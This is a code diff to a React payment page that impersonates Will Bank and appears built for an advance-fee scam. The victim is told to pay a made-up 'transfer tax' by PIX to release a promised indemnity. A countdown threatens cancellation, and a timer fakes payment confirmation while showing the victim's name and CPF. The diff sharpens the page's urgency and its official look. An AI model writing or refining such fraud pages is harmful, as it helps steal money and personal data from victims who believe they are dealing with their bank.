@@ -1,41 +1,30 @@
 import { useEffect, useState } from "react";
 import { useNavigate, useLocation } from "react-router-dom";
 import { Button } from "@/components/ui/button";
-import { Input } from "@/components/ui/input";
 import { 
   CheckCircle, 
-  Wallet, 
   Copy, 
-  ShieldCheck,
   Clock,
-  AlertTriangle,
-  ChevronRight,
-  Shield,
-  Loader2,
   QrCode,
-  CreditCard,
-  BadgeCheck
+  Loader2
 } from "lucide-react";
-import willbankLogo from "@/assets/willbank-logo.png";
+import WillBankHeader from "@/components/WillBankHeader";
+import WillBankCard from "@/components/WillBankCard";
 import { CPFData } from "@/lib/cpf";
 import { toast } from "@/hooks/use-toast";
+import willbankLogo from "@/assets/willbank-logo.png";
 
 const Saque = () => {
   const navigate = useNavigate();
   const location = useLocation();
-  const [pixKey, setPixKey] = useState("");
   const [isProcessing, setIsProcessing] = useState(false);
   const [isCompleted, setIsCompleted] = useState(false);
-  const [countdown, setCountdown] = useState(300); // 5 minutes
+  const [countdown, setCountdown] = useState(600); // 10 minutes
 
   const cpfData: CPFData | undefined = location.state?.cpfData;
   const valorBeneficio: number | undefined = location.state?.valorBeneficio;
-
-  // Valor da taxa (aleatório entre R$ 47,90 e R$ 97,90)
-  const [valorTaxa] = useState(() => {
-    const taxa = Math.floor(Math.random() * (97.90 - 47.90 + 1) + 47.90);
-    return taxa;
-  });
+  const valorTaxa: number | undefined = location.state?.valorTaxa;
+  const protocolo: string | undefined = location.state?.protocolo;
 
   useEffect(() => {
     if (!cpfData || !valorBeneficio) {
@@ -68,238 +57,156 @@ const Saque = () => {
     navigator.clipboard.writeText(pixCode);
     toast({
       title: "Código PIX copiado! ✓",
-      description: "Cole o código no seu aplicativo bancário para realizar o pagamento",
+      description: "Cole o código no seu aplicativo bancário",
     });
   };
 
   const handleConfirmarPagamento = () => {
-    if (!pixKey.trim()) {
-      toast({
-        variant: "destructive",
-        title: "Chave PIX obrigatória",
-        description: "Informe sua chave PIX para receber o benefício",
-      });
-      return;
-    }
-
     setIsProcessing(true);
     
     setTimeout(() => {
       setIsProcessing(false);
       setIsCompleted(true);
       toast({
-        title: "Solicitação enviada!",
-        description: "Seu saque está sendo processado",
+        title: "Pagamento confirmado!",
+        description: "Sua indenização será processada em breve",
       });
     }, 3000);
   };
 
   if (!cpfData || !valorBeneficio) return null;
 
+  const taxaFinal = valorTaxa || (valorBeneficio * 0.0071);
+
   return (
-    <div className="min-h-screen bg-gradient-to-b from-slate-900 via-slate-800 to-slate-900 flex flex-col">
-      {/* Header */}
-      <header className="px-4 py-4 flex items-center justify-between">
-        <img src={willbankLogo} alt="Will Bank" className="h-8 object-contain" />
-        <div className="flex items-center gap-2 text-emerald-400 text-xs">
-          <Shield className="w-4 h-4" />
-          <span>Pagamento seguro</span>
-        </div>
-      </header>
+    <div className="min-h-screen bg-background flex flex-col">
+      <WillBankHeader 
+        userName={cpfData.nome.split(' ')[0].toUpperCase()} 
+        breadcrumb="Benefício > Indenização > Pagamento"
+      />
 
-      {/* Breadcrumb */}
-      <div className="px-4 py-2 border-b border-slate-700/50">
-        <div className="flex items-center gap-2 text-xs text-slate-400">
-          <span>Consulta</span>
-          <ChevronRight className="w-3 h-3" />
-          <span>Chat</span>
-          <ChevronRight className="w-3 h-3" />
-          <span className="text-white font-medium">Saque</span>
-        </div>
-      </div>
-
-      {/* Main Content */}
-      <main className="flex-1 flex flex-col items-center px-4 py-6">
-        <div className="w-full max-w-md space-y-6">
-          
+      <main className="flex-1 flex items-center justify-center p-4 sm:p-6">
+        <WillBankCard className="w-full max-w-lg">
           {!isCompleted ? (
-            <>
-              {/* Countdown */}
-              <div className="bg-amber-500/10 border border-amber-500/30 rounded-xl p-4 flex items-center justify-center gap-3">
-                <Clock className="w-5 h-5 text-amber-400" />
-                <div className="text-center">
-                  <p className="text-amber-400 text-sm font-medium">Oferta expira em</p>
-                  <p className="text-2xl font-bold text-amber-400 font-mono">{formatTime(countdown)}</p>
-                </div>
-              </div>
-
-              {/* Title */}
+            <div className="space-y-6">
+              {/* Header */}
               <div className="text-center space-y-2">
-                <div className="w-16 h-16 mx-auto bg-primary/20 rounded-full flex items-center justify-center">
-                  <Wallet className="w-8 h-8 text-primary" />
-                </div>
-                <h1 className="text-2xl font-bold text-white">
-                  Finalize seu saque
-                </h1>
-                <p className="text-slate-400 text-sm">
-                  Pague a taxa de processamento para liberar seu benefício
-                </p>
+                <img src={willbankLogo} alt="Will Bank" className="h-10 mx-auto" />
+                <h1 className="text-xl font-bold">Pagamento do Imposto de Transferência</h1>
               </div>
 
-              {/* Benefit Value */}
-              <div className="bg-gradient-to-r from-emerald-500/20 to-emerald-600/10 rounded-xl p-4 border border-emerald-500/30">
-                <div className="flex items-center justify-between">
-                  <div>
-                    <p className="text-slate-400 text-sm">Valor a receber:</p>
-                    <p className="text-3xl font-bold text-emerald-400">
-                      R$ {valorBeneficio.toLocaleString('pt-BR')},00
-                    </p>
+              {/* Countdown */}
+              <div className="bg-red-50 border border-red-200 rounded-xl p-4 text-center">
+                <div className="flex items-center justify-center gap-2 text-red-600">
+                  <Clock className="w-5 h-5" />
+                  <span className="font-medium">Tempo restante para pagamento:</span>
+                </div>
+                <p className="text-3xl font-bold text-red-600 font-mono mt-2">{formatTime(countdown)}</p>
+                <p className="text-xs text-red-500 mt-1">Após este prazo, sua indenização será cancelada</p>
+              </div>
+
+              {/* Values Summary */}
+              <div className="bg-muted rounded-xl p-4 space-y-3">
+                <div className="flex justify-between">
+                  <span className="text-muted-foreground">Indenização a receber:</span>
+                  <span className="font-bold text-green-600">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
+                </div>
+                <div className="flex justify-between border-t pt-3">
+                  <span className="text-muted-foreground">Imposto a pagar:</span>
+                  <span className="font-bold text-primary">R$ {taxaFinal.toFixed(2).replace('.', ',')}</span>
+                </div>
+                {protocolo && (
+                  <div className="flex justify-between border-t pt-3">
+                    <span className="text-muted-foreground">Protocolo:</span>
+                    <span className="font-mono text-sm">{protocolo}</span>
                   </div>
-                  <BadgeCheck className="w-12 h-12 text-emerald-400/50" />
-                </div>
+                )}
               </div>
 
-              {/* Fee Info */}
-              <div className="bg-slate-800/50 rounded-xl p-4 space-y-4 border border-slate-700/50">
-                <div className="flex items-center justify-between">
-                  <span className="text-slate-400">Taxa de liberação:</span>
-                  <span className="text-xl font-bold text-white">
-                    R$ {valorTaxa.toFixed(2).replace('.', ',')}
-                  </span>
-                </div>
+              {/* QR Code */}
+              <div className="text-center space-y-4">
+                <p className="text-sm text-muted-foreground">Escaneie o QR Code ou copie o código PIX:</p>
                 
-                <div className="flex items-start gap-2 bg-amber-500/10 rounded-lg p-3 border border-amber-500/20">
-                  <AlertTriangle className="w-4 h-4 text-amber-400 shrink-0 mt-0.5" />
-                  <p className="text-xs text-amber-200">
-                    Esta taxa cobre os custos de processamento e transferência do seu benefício via PIX.
-                  </p>
-                </div>
-              </div>
-
-              {/* PIX Key Input */}
-              <div className="space-y-2">
-                <label className="text-sm font-medium text-slate-300 flex items-center gap-2">
-                  <CreditCard className="w-4 h-4" />
-                  Sua chave PIX para receber
-                </label>
-                <Input
-                  placeholder="CPF, e-mail ou telefone"
-                  value={pixKey}
-                  onChange={(e) => setPixKey(e.target.value)}
-                  className="h-12 bg-slate-800 border-slate-600 text-white placeholder:text-slate-500"
-                />
-              </div>
-
-              {/* PIX Code */}
-              <div className="space-y-3">
-                <p className="text-sm text-slate-400 text-center">
-                  Pague a taxa via PIX Copia e Cola:
-                </p>
-                
-                <div className="bg-slate-800/50 rounded-xl p-4 border border-slate-700/50 space-y-4">
-                  {/* QR Code Placeholder */}
-                  <div className="w-32 h-32 mx-auto bg-white rounded-lg flex items-center justify-center">
-                    <QrCode className="w-24 h-24 text-slate-900" />
+                <div className="w-48 h-48 mx-auto bg-white rounded-xl border-2 border-primary p-2">
+                  <div className="w-full h-full bg-gray-100 rounded-lg flex items-center justify-center">
+                    <QrCode className="w-32 h-32 text-foreground" />
                   </div>
-
-                  <Button
-                    variant="outline"
-                    onClick={handleCopiarPix}
-                    className="w-full h-12 border-primary text-primary hover:bg-primary/10"
-                  >
-                    <Copy className="w-4 h-4 mr-2" />
-                    Copiar código PIX
-                  </Button>
                 </div>
+
+                <Button
+                  variant="outline"
+                  onClick={handleCopiarPix}
+                  className="w-full h-12 border-2 border-primary text-primary hover:bg-primary/10 rounded-full"
+                >
+                  <Copy className="w-4 h-4 mr-2" />
+                  Copiar código PIX
+                </Button>
               </div>
 
-              {/* CTA Button */}
+              {/* Confirm Button */}
               <Button 
                 onClick={handleConfirmarPagamento}
                 disabled={isProcessing}
-                className="w-full h-14 text-lg font-semibold bg-primary hover:bg-primary/90 text-primary-foreground"
+                className="w-full h-14 text-lg font-semibold bg-primary hover:bg-primary/90 text-primary-foreground rounded-full"
               >
                 {isProcessing ? (
                   <>
                     <Loader2 className="w-5 h-5 animate-spin mr-2" />
-                    Processando...
+                    Verificando pagamento...
                   </>
                 ) : (
-                  <>
-                    Já paguei, confirmar saque
-                    <ChevronRight className="w-5 h-5 ml-2" />
-                  </>
+                  "Já paguei, liberar minha indenização"
                 )}
               </Button>
 
-              <div className="flex items-center justify-center gap-2 text-slate-500">
-                <ShieldCheck className="w-4 h-4" />
-                <span className="text-xs">Pagamento 100% seguro e criptografado</span>
-              </div>
-            </>
+              <p className="text-xs text-center text-muted-foreground">
+                Após a confirmação do pagamento, sua indenização será liberada em até 24h úteis.
+              </p>
+            </div>
           ) : (
             /* Success State */
-            <div className="text-center space-y-6 py-8 animate-fade-in">
-              <div className="w-24 h-24 mx-auto bg-emerald-500/20 rounded-full flex items-center justify-center">
-                <CheckCircle className="w-16 h-16 text-emerald-400" />
+            <div className="text-center space-y-6 py-8 animate-scale-in">
+              <div className="w-24 h-24 mx-auto bg-green-100 rounded-full flex items-center justify-center">
+                <CheckCircle className="w-16 h-16 text-green-500" />
               </div>
               
               <div className="space-y-2">
-                <h1 className="text-2xl font-bold text-white">
-                  Solicitação Enviada!
-                </h1>
-                <p className="text-slate-400">
-                  Seu pedido de saque está sendo processado.
+                <h1 className="text-2xl font-bold">Pagamento Confirmado!</h1>
+                <p className="text-muted-foreground">
+                  Sua indenização está sendo processada.
                 </p>
               </div>
 
-              <div className="bg-slate-800/50 rounded-xl p-4 border border-slate-700/50 space-y-3 text-left">
-                <div className="flex justify-between py-2 border-b border-slate-700">
-                  <span className="text-slate-400">Nome:</span>
-                  <span className="text-white font-medium">{cpfData.nome}</span>
+              <div className="bg-green-50 border border-green-200 rounded-xl p-4 space-y-3 text-left">
+                <div className="flex justify-between">
+                  <span className="text-muted-foreground">Beneficiário:</span>
+                  <span className="font-medium">{cpfData.nome}</span>
                 </div>
-                <div className="flex justify-between py-2 border-b border-slate-700">
-                  <span className="text-slate-400">Chave PIX:</span>
-                  <span className="text-white font-medium">{pixKey}</span>
+                <div className="flex justify-between">
+                  <span className="text-muted-foreground">CPF:</span>
+                  <span className="font-medium">{cpfData.cpf}</span>
                 </div>
-                <div className="flex justify-between py-2 border-b border-slate-700">
-                  <span className="text-slate-400">Valor:</span>
-                  <span className="text-emerald-400 font-bold">R$ {valorBeneficio.toLocaleString('pt-BR')},00</span>
+                <div className="flex justify-between">
+                  <span className="text-muted-foreground">Valor:</span>
+                  <span className="font-bold text-green-600">R$ {valorBeneficio.toLocaleString('pt-BR', { minimumFractionDigits: 2 })}</span>
                 </div>
-                <div className="flex justify-between py-2">
-                  <span className="text-slate-400">Prazo:</span>
-                  <span className="text-white font-medium">Até 24h úteis</span>
+                <div className="flex justify-between">
+                  <span className="text-muted-foreground">Previsão:</span>
+                  <span className="font-medium">Até 24h úteis</span>
                 </div>
-              </div>
-
-              <div className="bg-emerald-500/10 border border-emerald-500/30 rounded-xl p-4">
-                <p className="text-emerald-400 text-sm">
-                  ✓ Você receberá uma notificação assim que o valor for depositado na sua conta.
-                </p>
               </div>
 
               <Button 
                 onClick={() => navigate("/")}
                 variant="outline"
-                className="w-full h-12 border-slate-600 text-slate-300 hover:bg-slate-700"
+                className="w-full h-12 rounded-full"
               >
                 Voltar ao início
               </Button>
             </div>
           )}
-
-        </div>
+        </WillBankCard>
       </main>
-
-      {/* Footer */}
-      <footer className="px-4 py-4 border-t border-slate-800">
-        <div className="text-center space-y-2">
-          <img src={willbankLogo} alt="Will Bank" className="h-5 mx-auto object-contain opacity-50" />
-          <p className="text-slate-600 text-xs">
-            © 2025 Will Bank. Todos os direitos reservados.
-          </p>
-        </div>
-      </footer>
     </div>
   );
 };
